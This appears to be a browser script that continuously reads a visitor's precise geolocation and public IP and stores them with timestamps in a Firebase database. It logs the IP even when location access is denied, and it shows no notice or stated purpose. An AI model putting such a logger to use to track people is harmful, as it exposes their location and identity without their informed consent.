function success(position) {
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude;
    //document.getElementById("demo").innerHTML = latitude + ", " + longitude;
    $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
        let ip = JSON.stringify(data).slice(7, -2)
        writeUserData1(latitude, longitude, ip, getCurrentTime())
    });

}
//10
function error() {
    $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
        let ip = JSON.stringify(data).slice(7, -2)
        writeUserData2(ip, getCurrentTime())
    });
    alert('Sorry, we are not able to detect your location.');
}

const options = {
    enableHighAccuracy: true,
    maximumAge: 10000,
    timeout: 27000
};

const watchID = navigator.geolocation.watchPosition(success, error, options);


function getCurrentTime() {
    let d = new Date()
    return d.getTime()
}


function writeUserData1(lat, long, ip, time) {
    firebase.database().ref('location-756c5').push().set({
        latitude: lat,
        longitude: long,
        ip: ip,
        timestamp: time
    });
}

function writeUserData2(ip, time) {
    firebase.database().ref('location-756c5').push().set({
        ip: ip,
        timestamp: time
    });
}

